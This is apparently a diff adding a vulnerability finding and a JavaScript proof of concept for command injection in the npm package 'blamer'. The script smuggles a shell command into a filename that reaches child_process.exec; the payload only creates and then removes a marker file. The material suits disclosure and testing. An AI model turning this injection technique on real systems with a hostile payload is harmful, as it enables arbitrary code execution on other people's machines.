@@ -1,0 +1,27 @@
+Confirmed the injection point: `blamer` builds a shell command via `child_process.exec('git blame ' + args + ' ' + realFile, ...)` in `node_modules/blamer/src/vcs/git.js`, where `realFile` is only `path.basename(file)` — a filename with no `/` passes through unsanitized, allowing shell metacharacters to inject arbitrary commands.
+
+```javascript
+const Blamer = require("./node_modules/blamer/src/Blamer");
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+
+const markerFile = path.join(os.tmpdir(), "blamer_pwned_" + Date.now());
+
+// path.basename() only strips directory components, so a filename with
+// no "/" passes through untouched into the shell command built by
+// node_modules/blamer/src/vcs/git.js -> exec('git blame ' + args + ' ' + realFile)
+const maliciousFile = `x; touch ${markerFile}; #`;
+
+const blamer = new Blamer("git");
+
+blamer.blameByFile(maliciousFile).catch(() => {
+  // git blame itself fails (no such file), but the injected command still runs
+  if (fs.existsSync(markerFile)) {
+    console.log("Command injection confirmed! Marker file created:", markerFile);
+    fs.unlinkSync(markerFile);
+  } else {
+    console.log("Exploit failed - marker file not found");
+  }
+});
+```
